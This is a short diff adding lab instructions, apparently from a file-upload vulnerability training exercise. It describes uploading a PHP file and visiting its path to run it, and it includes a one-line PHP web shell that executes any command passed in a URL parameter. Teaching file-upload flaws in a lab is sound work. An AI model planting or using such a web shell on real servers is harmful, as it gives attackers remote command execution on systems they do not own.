@@ -1,0 +1,15 @@
+-> Server Side Attack Variant 1
+
+Make php file with any of code, samples:
+
+<?php echo "hacked"; ?>
+
+<?php phpinfo(); ?>
+
+<?php system($_GET[‘cmd’]); ?>
+
+Save it in filename.php
+
+Upload it
+
+Visit the path /static/uploads/File-Upload-Vulnerabilities-V1/filename.php and file will get executed
